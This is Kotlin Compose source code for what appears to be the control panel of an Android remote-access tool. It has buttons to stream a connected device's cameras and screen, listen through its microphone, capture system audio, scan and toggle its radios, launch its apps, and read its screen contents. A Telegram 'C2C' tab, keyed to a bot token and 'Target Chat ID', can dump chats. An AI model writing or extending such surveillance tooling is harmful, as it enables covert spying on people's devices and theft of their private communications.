        LazyVerticalGrid(columns = GridCells.Fixed(4), horizontalArrangement = Arrangement.spacedBy(8.dp), verticalArrangement = Arrangement.spacedBy(8.dp)) {
            items(viewModel.pushMessages) { msg ->
                Column(horizontalAlignment = Alignment.CenterHorizontally, modifier = Modifier.clickable { scope.launch { viewModel.pushNtfy(msg.cmd, msg.arg) } }) {
                    Box(modifier = Modifier.size(64.dp).clip(RoundedCornerShape(12.dp)).background(CyberDarkGray).border(1.dp, CyberNeonCyan, RoundedCornerShape(12.dp)).clickable { curIconMsgId = msg.id; photoPicker.launch(PickVisualMediaRequest(ActivityResultContracts.PickVisualMedia.ImageOnly)) }, contentAlignment = Alignment.Center) {
                        if (msg.iconUri != null) AsyncImage(model = msg.iconUri, contentDescription = null, contentScale = ContentScale.Crop, modifier = Modifier.fillMaxSize())
                        else Text(msg.label.take(2).uppercase(), color = CyberNeonCyan, fontFamily = CyberFont, fontWeight = FontWeight.Bold, fontSize = 24.sp)
                    }
                    Text(msg.label, color = CyberWhite, fontFamily = UbuntuInputFont, fontSize = 10.sp, maxLines = 1, textAlign = TextAlign.Center, modifier = Modifier.padding(top = 4.dp))
                }
            }
        }
    }
}

@Composable
fun SetupTab(viewModel: CyberViewModel) {
    var editUrl by remember { mutableStateOf(viewModel.serverUrl) }
    var editTopic by remember { mutableStateOf(viewModel.topic) }
    var newLabel by remember { mutableStateOf("") }; var newCmd by remember { mutableStateOf("") }; var reqArg by remember { mutableStateOf(false) }

    LazyColumn(modifier = Modifier.fillMaxSize().padding(16.dp)) {
        item {
            Text("NETWORK CONFIG", color = CyberNeonPink, fontFamily = CyberFont, fontWeight = FontWeight.Bold)
            OutlinedTextField(value = editUrl, onValueChange = { editUrl = it }, label = { Text("URL", fontFamily = UbuntuInputFont) }, modifier = Modifier.fillMaxWidth())
            OutlinedTextField(value = editTopic, onValueChange = { editTopic = it }, label = { Text("Topic", fontFamily = UbuntuInputFont) }, modifier = Modifier.fillMaxWidth())
            Button(onClick = { viewModel.saveConfig(editUrl, editTopic) }, modifier = Modifier.fillMaxWidth().padding(top=8.dp)) { Text("SAVE NETWORK", fontFamily = CyberFont) }
            Spacer(modifier = Modifier.height(32.dp))
            Text("NEW DIRECTIVE", color = CyberNeonPink, fontFamily = CyberFont, fontWeight = FontWeight.Bold)
            OutlinedTextField(value = newLabel, onValueChange = { newLabel = it }, label = { Text("Label", fontFamily = UbuntuInputFont) }, modifier = Modifier.fillMaxWidth())
            OutlinedTextField(value = newCmd, onValueChange = { newCmd = it }, label = { Text("Command", fontFamily = UbuntuInputFont) }, modifier = Modifier.fillMaxWidth())
            Row(verticalAlignment = Alignment.CenterVertically) { Checkbox(checked = reqArg, onCheckedChange = { reqArg = it }); Text("Has Argument", color = CyberWhite, fontFamily = CyberFont) }
            Button(onClick = { if (newLabel.isNotBlank() && newCmd.isNotBlank()) { viewModel.saveNewCommand(newLabel, newCmd, reqArg); newLabel = ""; newCmd = ""; reqArg = false } }, modifier = Modifier.fillMaxWidth()) { Text("SAVE CMD", fontFamily = CyberFont) }
        }
    }
}

@OptIn(ExperimentalMaterial3Api::class, ExperimentalFoundationApi::class)
@Composable
fun ServerTab(viewModel: CyberViewModel) {
    val context = LocalContext.current
    val isConn = ServerCore.liveSession?.isActive == true
    val pagerState = rememberPagerState(pageCount = { if(isConn) 2 else 1 })

    LaunchedEffect(isConn) {
        if (isConn) { delay(1000); pagerState.animateScrollToPage(1) }
        else pagerState.animateScrollToPage(0)
    }

    HorizontalPager(state = pagerState, userScrollEnabled = isConn, modifier = Modifier.fillMaxSize()) { page ->
        if (page == 0) TerminalPage(viewModel, context) else LiveControlPage(viewModel, context)
    }
}

@Composable
fun TerminalPage(viewModel: CyberViewModel, context: Context) {
    val clipboard = LocalClipboardManager.current
    val listState = rememberLazyListState()
    LaunchedEffect(viewModel.serverLogs.size) { if(viewModel.serverLogs.isNotEmpty()) listState.animateScrollToItem(viewModel.serverLogs.size - 1) }

    Column(modifier = Modifier.fillMaxSize().padding(16.dp)) {
        Row(verticalAlignment = Alignment.CenterVertically, modifier = Modifier.fillMaxWidth()) {
            OutlinedTextField(value = viewModel.localServerPort, onValueChange = { viewModel.localServerPort = it }, label = { Text("Port", fontFamily = UbuntuInputFont) }, modifier = Modifier.weight(1f))
            Spacer(modifier = Modifier.width(16.dp))
            Button(onClick = { viewModel.toggleServer(context) }, colors = ButtonDefaults.buttonColors(containerColor = if (viewModel.isServerRunning) CyberNeonPink else CyberNeonYellow, contentColor = CyberBlack), modifier = Modifier.height(56.dp).padding(top = 8.dp)) {
                Text(if (viewModel.isServerRunning) "HALT" else "INIT", fontFamily = CyberFont, fontWeight = FontWeight.Bold)
            }
        }
        Spacer(modifier = Modifier.height(16.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
            Text("NODE TERMINAL:", color = CyberNeonYellow, fontFamily = CyberFont)
            Row {
                IconButton(onClick = { clipboard.setText(AnnotatedString(viewModel.serverLogs.joinToString("\n"))) }) { Icon(Icons.Default.ContentCopy, "Copy", tint = CyberNeonYellow) }
                IconButton(onClick = { viewModel.serverLogs.clear() }) { Icon(Icons.Default.DeleteSweep, "Clear", tint = CyberNeonPink) }
            }
        }
        Box(modifier = Modifier.fillMaxWidth().weight(1f).border(1.dp, CyberNeonYellow, MaterialTheme.shapes.small).background(Color.Black).padding(8.dp)) {
            LazyColumn(state = listState) { items(viewModel.serverLogs) { log -> Text(parseLogColor(log), fontFamily = CyberFont, fontSize = 11.sp, lineHeight = 14.sp) } }
        }
    }
}

@Composable
fun LiveControlPage(viewModel: CyberViewModel, context: Context) {
    var showAppTray by remember { mutableStateOf(false) }
    var showAudioModal by remember { mutableStateOf(false) }
    var showScreenJson by remember { mutableStateOf(false) }
    var showScreenCast by remember { mutableStateOf(false) }

    if (showAppTray) AppTrayModal(viewModel) { showAppTray = false }
    if (showAudioModal) AudioControlModal(viewModel, context) { showAudioModal = false }
    if (showScreenJson) ScreenJsonModal(viewModel) { showScreenJson = false }
    if (showScreenCast) ScreenCastOverlay(viewModel) { showScreenCast = false }
    if (viewModel.showScanResultsModal) ScanResultsModal(viewModel) { viewModel.showScanResultsModal = false; viewModel.scanResults = emptyList() }

    Column(modifier = Modifier.fillMaxSize().padding(16.dp)) {
        Card(modifier = Modifier.fillMaxWidth().border(1.dp, if(viewModel.latestSlabTxt.contains("SUCCESS")) LogBrightGreen else if(viewModel.latestSlabTxt.contains("FAILURE")) LogMediumRed else CyberNeonCyan, MaterialTheme.shapes.small), colors = CardDefaults.cardColors(containerColor = CyberBlack)) {
            Text(viewModel.latestSlabTxt, color = CyberWhite, fontFamily = CyberFont, fontSize = 12.sp, modifier = Modifier.padding(12.dp))
        }
        Spacer(modifier = Modifier.height(16.dp))
        
        Row(modifier = Modifier.fillMaxWidth().clip(RoundedCornerShape(50)).background(CyberDarkGray).padding(vertical = 8.dp), horizontalArrangement = Arrangement.SpaceEvenly) {
            IconButton(onClick = { viewModel.sendLive("btn_back") }) { Icon(Icons.Default.ArrowBack, "Back", tint = CyberWhite) }
            IconButton(onClick = { viewModel.sendLive("btn_home") }) { Icon(Icons.Default.Home, "Home", tint = CyberWhite) }
            IconButton(onClick = { viewModel.sendLive("btn_recents") }) { Icon(Icons.Default.Menu, "Recents", tint = CyberWhite) }
        }
        Spacer(modifier = Modifier.height(16.dp))

        Text("STREAMS & MEDIA", color = CyberNeonYellow, fontFamily = CyberFont)
        LazyVerticalGrid(columns = GridCells.Fixed(2), horizontalArrangement = Arrangement.spacedBy(8.dp), verticalArrangement = Arrangement.spacedBy(8.dp)) {
            item { Button(onClick = { showAudioModal = true }, colors = ButtonDefaults.buttonColors(containerColor = CyberNeonCyan, contentColor = CyberBlack)) { Text("Audio/Call Hub", fontFamily = CyberFont) } }
            item { Button(onClick = { showScreenCast = true; viewModel.sendLive("live_screen_cast", "start") }, colors = ButtonDefaults.buttonColors(containerColor = CyberNeonPink, contentColor = CyberBlack)) { Text("Screen Cast", fontFamily = CyberFont) } }
            item { Button(onClick = { viewModel.sendLive("stream_cam_front", "start") }) { Text("Front Cam Stream", fontFamily = CyberFont) } }
            item { Button(onClick = { viewModel.sendLive("stream_cam_back", "start") }) { Text("Back Cam Stream", fontFamily = CyberFont) } }
        }
        Spacer(modifier = Modifier.height(16.dp))

        Text("CONNECTIVITY", color = CyberNeonYellow, fontFamily = CyberFont)
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            Button(onClick = { viewModel.sendLive("wifi_toggle") }, modifier = Modifier.weight(1f)) { Text("WIFI", fontFamily = CyberFont) }
            Button(onClick = { viewModel.sendLive("bt_toggle") }, modifier = Modifier.weight(1f)) { Text("BT", fontFamily = CyberFont) }
            Button(onClick = { viewModel.sendLive("hotspot_toggle") }, modifier = Modifier.weight(1f)) { Text("Hotspot", fontFamily = CyberFont) }
        }
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            Button(onClick = { viewModel.scanResults = emptyList(); viewModel.sendLive("wifi_scan") }, modifier = Modifier.weight(1f)) { Text("Scan WIFI", fontFamily = CyberFont) }
            Button(onClick = { viewModel.scanResults = emptyList(); viewModel.sendLive("bt_scan") }, modifier = Modifier.weight(1f)) { Text("Scan BT", fontFamily = CyberFont) }
        }
        Spacer(modifier = Modifier.height(16.dp))

        Text("SYSTEM & DATA", color = CyberNeonYellow, fontFamily = CyberFont)
        LazyVerticalGrid(columns = GridCells.Fixed(2), horizontalArrangement = Arrangement.spacedBy(8.dp), verticalArrangement = Arrangement.spacedBy(8.dp)) {
            item { Button(onClick = { showAppTray = true }) { Text("Launch Apps", fontFamily = CyberFont) } }
            item { Button(onClick = { showScreenJson = true; viewModel.sendLive("stream_screen_start") }) { Text("Screen JSON Tree", fontFamily = CyberFont) } }
            item { Button(onClick = { viewModel.sendLive("stream_sensors", "start") }) { Text("Stream Sensors", fontFamily = CyberFont) } }
            item { Button(onClick = { viewModel.sendLive("vibrate", "1000") }) { Text("Vibrate", fontFamily = CyberFont) } }
        }
    }
}

@Composable
fun ScanResultsModal(viewModel: CyberViewModel, onDismiss: () -> Unit) {
    Dialog(onDismissRequest = onDismiss, properties = DialogProperties(usePlatformDefaultWidth = false)) {
        Card(modifier = Modifier.fillMaxWidth(0.9f).fillMaxHeight(0.7f), colors = CardDefaults.cardColors(containerColor = CyberBlack), border = BorderStroke(1.dp, CyberNeonCyan)) {
            Column(modifier = Modifier.padding(16.dp)) {
                Text("${viewModel.currentScanType.uppercase()} SCAN RESULTS", color = CyberNeonCyan, fontFamily = CyberFont, fontWeight = FontWeight.Bold, fontSize = 20.sp)
                Spacer(modifier = Modifier.height(8.dp))
                LazyColumn(modifier = Modifier.weight(1f).border(1.dp, CyberDarkGray).padding(8.dp)) {
                    if (viewModel.scanResults.isEmpty()) {
                        item { Text("No results found or still scanning...", color = Color.Gray, fontFamily = CyberFont) }
                    } else {
                        items(viewModel.scanResults) { result ->
                            Row(modifier = Modifier.fillMaxWidth().padding(vertical = 4.dp), verticalAlignment = Alignment.CenterVertically) {
                                Icon(if(viewModel.currentScanType == "WIFI") Icons.Default.Wifi else Icons.Default.Bluetooth, null, tint = CyberNeonYellow, modifier = Modifier.size(24.dp))
                                Spacer(modifier = Modifier.width(8.dp))
                                Column {
                                    Text(result.first, color = CyberWhite, fontFamily = UbuntuInputFont, fontWeight = FontWeight.Bold)
                                    Text(result.second, color = Color.Gray, fontFamily = CyberFont, fontSize = 10.sp)
                                }
                            }
                        }
                    }
                }
                Button(onClick = onDismiss, modifier = Modifier.fillMaxWidth().padding(top = 8.dp), colors = ButtonDefaults.buttonColors(containerColor = CyberNeonPink)) { Text("CLOSE SCAN") }
            }
        }
    }
}
@OptIn(ExperimentalMaterial3Api::class) 
@Composable
fun TelegramTab(viewModel: CyberViewModel) {
    // Exact same Telegram UI implementation from previous block
    if (!viewModel.isTgLoggedIn) {
        var token by remember { mutableStateOf("") }; var chatId by remember { mutableStateOf("") }
        Column(modifier = Modifier.fillMaxSize().padding(24.dp), verticalArrangement = Arrangement.Center, horizontalAlignment = Alignment.CenterHorizontally) {
            Icon(Icons.Default.ChatBubbleOutline, "TG", tint = Color.White, modifier = Modifier.size(72.dp))
            Text("TG LINK", fontSize = 32.sp, fontFamily = CyberFont, color = Color.White)
            Spacer(modifier = Modifier.height(32.dp))
            OutlinedTextField(value = token, onValueChange = { token = it }, label = { Text("Bot Token", fontFamily = UbuntuInputFont) }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = Color.White, focusedLabelColor = Color.White))
            Spacer(modifier = Modifier.height(16.dp))
            OutlinedTextField(value = chatId, onValueChange = { chatId = it }, label = { Text("Target Chat ID", fontFamily = UbuntuInputFont) }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = Color.White, focusedLabelColor = Color.White))
            Spacer(modifier = Modifier.height(24.dp))
            Button(onClick = { viewModel.loginTelegram(token, chatId) }, modifier = Modifier.fillMaxWidth().height(56.dp), colors = ButtonDefaults.buttonColors(containerColor = Color.White, contentColor = CyberBlack)) { Text("CONNECT", fontFamily = CyberFont, fontWeight = FontWeight.Bold) }
        }
    } else {
        var inputTxt by remember { mutableStateOf("") }
        val listState = rememberLazyListState()
        var showMenu by remember { mutableStateOf(false) }
        var showSpeedDialog by remember { mutableStateOf(false) }
        
        LaunchedEffect(viewModel.tgMessages.size) { if(viewModel.tgMessages.isNotEmpty()) listState.animateScrollToItem(viewModel.tgMessages.size - 1) }
        
        if (showSpeedDialog) {
            AlertDialog(onDismissRequest = { showSpeedDialog = false }, title = { Text("Polling Speed", fontFamily = CyberFont, color = CyberWhite) }, containerColor = CyberDarkGray, text = {
                Column {
                    listOf("Fast" to 0L, "Medium" to 5000L, "Slow" to 15000L, "Super Slow" to 60000L).forEach { (label, delayMs) ->
                        TextButton(onClick = { viewModel.setPollingSpeed(delayMs); showSpeedDialog = false }) { Text("$label ${if (viewModel.tgPollingDelay == delayMs) "(Active)" else ""}", color = CyberNeonCyan, fontFamily = CyberFont) }
                    }
                }
            }, confirmButton = { TextButton(onClick = { showSpeedDialog = false }) { Text("CLOSE", color = CyberNeonPink, fontFamily = CyberFont) } })
        }

        Column(modifier = Modifier.fillMaxSize()) {
            TopAppBar(title = { Text("C2C Secure Comms", fontFamily = CyberFont, color = CyberBlack) }, colors = TopAppBarDefaults.topAppBarColors(containerColor = Color.White), actions = {
                Box {
                    IconButton(onClick = { showMenu = true }) { Icon(Icons.Default.MoreVert, "Menu", tint = CyberBlack) }
                    DropdownMenu(expanded = showMenu, onDismissRequest = { showMenu = false }, modifier = Modifier.background(CyberDarkGray)) {
                        DropdownMenuItem(text = { Text(if (viewModel.isTgPollingActive) "Pause Polling" else "Resume Polling", color = CyberWhite, fontFamily = CyberFont) }, onClick = { viewModel.togglePolling(); showMenu = false })
                        DropdownMenuItem(text = { Text("Polling Speed", color = CyberNeonCyan, fontFamily = CyberFont) }, onClick = { showSpeedDialog = true; showMenu = false })
                        DropdownMenuItem(text = { Text("Dump Chats", color = CyberWhite, fontFamily = CyberFont) }, onClick = { viewModel.dumpChats(); showMenu = false })
                        DropdownMenuItem(text = { Text("Clear Locally", color = CyberWhite, fontFamily = CyberFont) }, onClick = { viewModel.tgMessages.clear(); showMenu = false })
                        DropdownMenuItem(text = { Text("Logout", color = CyberNeonPink, fontFamily = CyberFont) }, onClick = { viewModel.logoutTelegram(); showMenu = false })
                    }
                }
            })
            LazyColumn(state = listState, modifier = Modifier.weight(1f).padding(8.dp), verticalArrangement = Arrangement.spacedBy(8.dp)) {
                items(viewModel.tgMessages) { msg ->
                    Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = if (msg.isMe) Arrangement.End else Arrangement.Start) {
                        Card(colors = CardDefaults.cardColors(containerColor = if (msg.isMe) CyberNeonCyan else CyberDarkGray), modifier = Modifier.widthIn(max = 280.dp)) {
                            Column(modifier = Modifier.padding(8.dp)) {
                                if (msg.photoId != null) {
                                    var imageUrl by remember { mutableStateOf<String?>(null) }
                                    if (imageUrl == null) Button(onClick = { viewModel.getTelegramFileUrl(msg.photoId) { url -> imageUrl = url } }) { Text("DL Image") }
                                    else AsyncImage(model = imageUrl, contentDescription = "Photo", modifier = Modifier.fillMaxWidth().height(200.dp))
                                }
                                if (msg.text.isNotBlank()) Text(msg.text, color = if(msg.isMe) CyberBlack else CyberWhite, fontFamily = UbuntuInputFont)
                            }
                        }
                    }
                }
            }
            Row(modifier = Modifier.fillMaxWidth().padding(8.dp), verticalAlignment = Alignment.CenterVertically) {
                OutlinedTextField(value = inputTxt, onValueChange = { inputTxt = it }, modifier = Modifier.weight(1f), placeholder = { Text("Secure transmit...", fontFamily = UbuntuInputFont) }, textStyle = LocalTextStyle.current.copy(fontFamily = UbuntuInputFont))
                Spacer(modifier = Modifier.width(8.dp))
                FloatingActionButton(onClick = { if (inputTxt.isNotBlank()) { viewModel.sendTelegramMessage(inputTxt); inputTxt = "" } }, containerColor = Color.White, contentColor = CyberBlack) { Icon(Icons.Default.Send, "Send") }
            }
        }
    }
}

@Composable
fun AppTrayModal(viewModel: CyberViewModel, onDismiss: () -> Unit) {
    var showAddApp by remember { mutableStateOf(false) }
    Dialog(onDismissRequest = onDismiss, properties = DialogProperties(usePlatformDefaultWidth = false)) {
        Card(modifier = Modifier.fillMaxWidth(0.9f).fillMaxHeight(0.8f), colors = CardDefaults.cardColors(containerColor = CyberDarkGray)) {
            if (showAddApp) {
                var n by remember { mutableStateOf("") }; var p by remember { mutableStateOf("") }; var u by remember { mutableStateOf<String?>(null) }
                val picker = rememberLauncherForActivityResult(ActivityResultContracts.PickVisualMedia()) { uri -> u = uri?.toString() }
                Column(modifier = Modifier.padding(16.dp)) {
                    Text("Add App Shortcut", color = CyberNeonCyan, fontFamily = CyberFont); Spacer(modifier = Modifier.height(8.dp))
                    OutlinedTextField(value = n, onValueChange = { n = it }, label = { Text("App Name") })
                    OutlinedTextField(value = p, onValueChange = { p = it }, label = { Text("Package Name") })
                    Button(onClick = { picker.launch(PickVisualMediaRequest(ActivityResultContracts.PickVisualMedia.ImageOnly)) }) { Text("Pick Icon") }
                    Button(onClick = { viewModel.addLiveApp(n, p, u); showAddApp = false }) { Text("SAVE") }
                }
            } else {
                Column(modifier = Modifier.fillMaxSize().padding(16.dp)) {
                    Text("REMOTE APP TRAY", color = CyberNeonCyan, fontFamily = CyberFont, fontWeight = FontWeight.Bold, fontSize = 20.sp)
                    Spacer(modifier = Modifier.height(16.dp))
                    LazyVerticalGrid(columns = GridCells.Fixed(3), modifier = Modifier.weight(1f)) {
                        items(viewModel.liveAppsList) { app ->
                            Column(horizontalAlignment = Alignment.CenterHorizontally, modifier = Modifier.clickable { viewModel.sendLive("launch_app", app.packageName); onDismiss() }.padding(8.dp)) {
                                Box(modifier = Modifier.size(56.dp).clip(CircleShape).background(Color.DarkGray), contentAlignment = Alignment.Center) {
                                    if (app.iconUri != null) AsyncImage(app.iconUri, null, contentScale = ContentScale.Crop)
                                    else Icon(Icons.Default.Android, null, tint = Color.Green)
                                }
                                Text(app.name, color = CyberWhite, fontSize = 10.sp, maxLines = 1)
                            }
                        }
                        item {
                            Column(horizontalAlignment = Alignment.CenterHorizontally, modifier = Modifier.clickable { showAddApp = true }.padding(8.dp)) {
                                Box(modifier = Modifier.size(56.dp).clip(CircleShape).background(CyberNeonPink), contentAlignment = Alignment.Center) { Icon(Icons.Default.Add, null, tint = CyberBlack) }
                                Text("Add", color = CyberWhite, fontSize = 10.sp)
                            }
                        }
                    }
                }
            }
        }
    }
}

@Composable
fun AudioControlModal(viewModel: CyberViewModel, context: Context, onDismiss: () -> Unit) {
    val filePicker = rememberLauncherForActivityResult(ActivityResultContracts.GetContent()) { uri ->
        if (uri != null) {
            val bytes = context.contentResolver.openInputStream(uri)?.readBytes()
            if (bytes != null) viewModel.sendLiveAudioBytes(bytes)
        }
    }
    Dialog(onDismissRequest = onDismiss) {
        Card(colors = CardDefaults.cardColors(containerColor = CyberDarkGray)) {
            Column(modifier = Modifier.padding(16.dp), horizontalAlignment = Alignment.CenterHorizontally) {
                Text("AUDIO / CALL HUB", color = CyberNeonYellow, fontFamily = CyberFont, fontWeight = FontWeight.Bold)
                Spacer(modifier = Modifier.height(16.dp))
                Row(horizontalArrangement = Arrangement.SpaceEvenly, modifier = Modifier.fillMaxWidth()) {
                    Button(onClick = { viewModel.sendLive("live_audio_mode", "call"); viewModel.isMicRunning = true; viewModel.startMic() }) { Text("Full Call") }
                    Button(onClick = { viewModel.sendLive("live_audio_mode", "mic") }) { Text("Listen Only") }
                }
                Spacer(modifier = Modifier.height(8.dp))
                Row(horizontalArrangement = Arrangement.SpaceEvenly, modifier = Modifier.fillMaxWidth()) {
                    Button(onClick = { viewModel.sendLive("live_audio_mode", "media") }) { Text("System Audio") }
                    Button(onClick = { viewModel.sendLive("live_audio_mode", "play"); filePicker.launch("audio/*") }) { Text("Play MP3") }
                }
                Spacer(modifier = Modifier.height(16.dp))
                Button(onClick = { viewModel.sendLive("live_audio_mode", "off"); viewModel.stopMic(); onDismiss() }, colors = ButtonDefaults.buttonColors(containerColor = LogMediumRed)) {
                    Icon(Icons.Default.CallEnd, null, tint = Color.White); Spacer(modifier = Modifier.width(8.dp)); Text("END AUDIO", color = Color.White)
                }
            }
        }
    }
}

@Composable
fun ScreenJsonModal(viewModel: CyberViewModel, onDismiss: () -> Unit) {
    Dialog(onDismissRequest = { viewModel.sendLive("stream_screen_stop"); onDismiss() }, properties = DialogProperties(usePlatformDefaultWidth = false)) {
        Card(modifier = Modifier.fillMaxWidth(0.9f).fillMaxHeight(0.9f), colors = CardDefaults.cardColors(containerColor = CyberBlack)) {
            Column(modifier = Modifier.padding(16.dp)) {
                Text("LIVE UI RENDER (JSON)", color = CyberNeonCyan, fontFamily = CyberFont)
                Spacer(modifier = Modifier.height(8.dp))
                if (viewModel.liveScreenJsonData.isEmpty()) CircularProgressIndicator(color = CyberNeonCyan)
                else {
                    LazyColumn(modifier = Modifier.weight(1f).border(1.dp, CyberDarkGray).padding(8.dp)) {
                        item { Text(viewModel.liveScreenJsonData, color = CyberNeonYellow, fontFamily = CyberFont, fontSize = 10.sp) }
                    }
                }
                Button(onClick = { viewModel.sendLive("stream_screen_stop"); onDismiss() }, modifier = Modifier.fillMaxWidth().padding(top = 8.dp), colors = ButtonDefaults.buttonColors(containerColor = CyberNeonPink)) { Text("STOP STREAM") }
            }
        }
    }
}

@Composable
fun ScreenCastOverlay(viewModel: CyberViewModel, onDismiss: () -> Unit) {
    var offsetX by remember { mutableFloatStateOf(0f) }
    var offsetY by remember { mutableFloatStateOf(0f) }
    var isFullScreen by remember { mutableStateOf(false) }

    Dialog(onDismissRequest = { viewModel.sendLive("live_screen_cast", "stop"); onDismiss() }, properties = DialogProperties(usePlatformDefaultWidth = false, decorFitsSystemWindows = false)) {
        Box(modifier = Modifier.fillMaxSize()) {
            Card(modifier = Modifier.offset { IntOffset(offsetX.roundToInt(), offsetY.roundToInt()) }.then(if(isFullScreen) Modifier.fillMaxSize() else Modifier.size(240.dp, 400.dp)).pointerInput(Unit) {
                    detectDragGestures { change, dragAmount -> change.consume(); offsetX += dragAmount.x; offsetY += dragAmount.y }
                }, colors = CardDefaults.cardColors(containerColor = CyberBlack), shape = if(isFullScreen) CutCornerShape(0.dp) else CutCornerShape(12.dp), border = BorderStroke(2.dp, CyberNeonCyan)) {
                Box(modifier = Modifier.fillMaxSize()) {
                    if (viewModel.liveScreenFrame == null) CircularProgressIndicator(color = CyberNeonCyan, modifier = Modifier.align(Alignment.Center))
                    else {
                        val bmp = BitmapFactory.decodeByteArray(viewModel.liveScreenFrame, 0, viewModel.liveScreenFrame!!.size)
                        if (bmp != null) Image(bitmap = bmp.asImageBitmap(), contentDescription = "Cast", modifier = Modifier.fillMaxSize(), contentScale = ContentScale.Fit)
                    }
                    Row(modifier = Modifier.align(Alignment.TopEnd).padding(4.dp)) {
                        IconButton(onClick = { isFullScreen = !isFullScreen }) { Icon(if(isFullScreen) Icons.Default.FullscreenExit else Icons.Default.Fullscreen, "Size", tint = CyberWhite) }
                        IconButton(onClick = { viewModel.sendLive("live_screen_cast", "stop"); onDismiss() }) { Icon(Icons.Default.Close, "Close", tint = CyberNeonPink) }
                    }
                }
            }
        }
    }
}